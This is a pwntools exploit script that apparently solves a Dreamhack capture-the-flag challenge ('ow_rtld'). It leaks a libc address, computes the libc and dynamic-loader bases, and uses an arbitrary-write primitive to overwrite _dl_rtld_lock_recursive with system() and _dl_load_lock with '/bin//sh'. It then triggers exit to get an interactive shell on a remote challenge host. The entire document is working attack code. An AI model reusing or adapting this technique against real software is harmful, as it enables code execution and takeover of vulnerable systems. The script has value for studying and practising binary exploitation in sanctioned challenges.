#!/usr/bin/env python3

from pwn import *

exe = ELF("./ow_rtld_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 19186)

    return r

def main():
    r = conn()

    r.recvuntil(b"stdout: ")
    _io_2_1_stdout_ = int(r.recvline()[:-1], 16)

    libc_base = _io_2_1_stdout_ - libc.symbols["_IO_2_1_stdout_"]
    ld_base = libc_base + 0x3f1000
    
    _dl_rtld_lock_recursive = ld_base + 0x228f60
    _dl_load_lock = ld_base + 0x228968
    system = libc_base + libc.symbols["system"]

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"addr: ", str(_dl_rtld_lock_recursive).encode())
    r.sendlineafter(b"data: ", str(system).encode())

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"addr: ", str(_dl_load_lock).encode())
    r.sendlineafter(b"data: ", str(u64(b"/bin//sh")).encode())

    r.sendlineafter(b"> ", b"-1")

    r.interactive()


if __name__ == "__main__":
    main()
